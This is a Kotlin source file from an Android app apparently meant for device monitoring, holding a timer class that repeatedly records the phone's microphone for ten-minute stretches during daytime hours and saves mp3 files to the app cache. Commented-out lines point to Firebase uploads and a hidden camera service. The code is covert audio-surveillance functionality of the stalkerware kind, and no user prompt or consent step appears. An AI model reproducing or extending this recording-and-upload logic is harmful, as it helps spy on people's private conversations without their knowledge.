package com.github.midros.istheapp.utils


import android.media.MediaRecorder
import android.os.CountDownTimer
import android.util.Log
import android.util.Log.i
import com.github.midros.istheapp.services.notificationService.InteractorNotificationService
import com.github.midros.istheapp.utils.Consts.TAG
//import com.pawegio.kandroid.i

import io.reactivex.disposables.CompositeDisposable
import java.io.File
import javax.inject.Inject
import java.text.SimpleDateFormat
import java.util.*

//import com.google.firebase.database.FirebaseDatabase
//import com.google.firebase.database.DatabaseReference

/**
 * Created by luis rafael on 19/03/18.
 */
class MyCountDownTimer(
    startTime: Long,
    interval: Long,
    private val timer: ((timer: Long) -> Unit)? = null,
    private val func: () -> Unit
) : CountDownTimer(startTime, interval) {

    @Inject
    lateinit var interactor: InteractorNotificationService


    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000).toLong()

    //  private fun getReference(child: String):            DatabaseReference = firebase.getDatabaseReference(child)
    //   private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()

    private var timer2: MyCountDownTimer? = null
    private var recorder: MediaRecorderUtils = MediaRecorderUtils {
        //    cancelTimer()
        FileHelper.deleteFile("hhh")
    }
    private var fileName: String? = null
    private var dateTime: String? = null
    private var nameAudio: String = ""

    // private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    override fun onFinish() = func()

    //    private fun getReference(child: String): DatabaseReference =   firebase.getDatabaseReference(child)
    override fun onTick(t: Long) {
        i(TAG, "timerxx $t");

        //     val childRecording = ChildRecording(true, 60000)
        //    getReference("${Consts.RECORDING}/${Consts.PARAMS}").setValue(childRecording)

        val sdf = SimpleDateFormat("EEEE")
        val d = Date()
        val day = sdf.format(d)
        val rightNow = Calendar.getInstance()
        val hour: Int = rightNow.get(Calendar.HOUR_OF_DAY)
        //   val database = FirebaseDatabase.getInstance()
        //  val refStorage = FirebaseStorage.getInstance().reference.child("images/$fileName")
        val fol = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/"
        try {
            if (hour >= 5 && hour <= 23) {
                if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()) {
                    val folder = File(fol)
                    if (!folder.exists()) {
                        val ee = folder.mkdir()
                    }

// 1 min = 60 * 1000
                    timer2 = MyCountDownTimer(10 * 60 * 1000, (1000 * 60).toLong(), {
                        //         setIntervalRecord(it)
                        i(TAG, "timerxx $t");
                    }) {
                        i(TAG, "fin recording $t");
                        recorder.stopRecording {
                            sendFileCall()

                        }
                        Log.i("finishRecording", "finishRecording")
                        File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
//                val filePath = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/"  // /${Consts.ADDRESS_AUDIO_RECORD}"
//                val dateName = fileName!!.replace("$filePath/", "")
//                val uri = Uri.fromFile(File(fileName))

//                    fileName = fileName?.replace(".mp3", ".txt")?.replace("audioRecord", "txts")
//                    var file2 = File(fileName)
//                    val isNewFileCreated2: Boolean = file2.createNewFile()
//                    val isNewFileCreated: Boolean = file.delete()
                    }

                    nameAudio = ConstFun.getRandomNumeric()
                    dateTime = ConstFun.getDateTime().replace(":", "-").replace(".", "")
                    fileName = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/" + dateTime + ".mp3" //context.getFileNameAudio(nameAudio, dateTime)
                    recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
                    timer2!!.start()
                //    val isNewFileCreated: Boolean = file.createNewFile()
                    i(TAG, "inicia record stick $t");
                }
            }
        } catch (e: Throwable) {
//            sendFile()
            Log.i("errorrrr", e.message.toString())
            //        e(Consts.TAG, e.message.toString())
            //  errorAction()
        }
    }

    private fun sendFileCall() {
        i(TAG, "finnn");
    }
//    companion object {
//
//        @Inject
//    lateinit var firebase: InterfaceFirebase
//}
}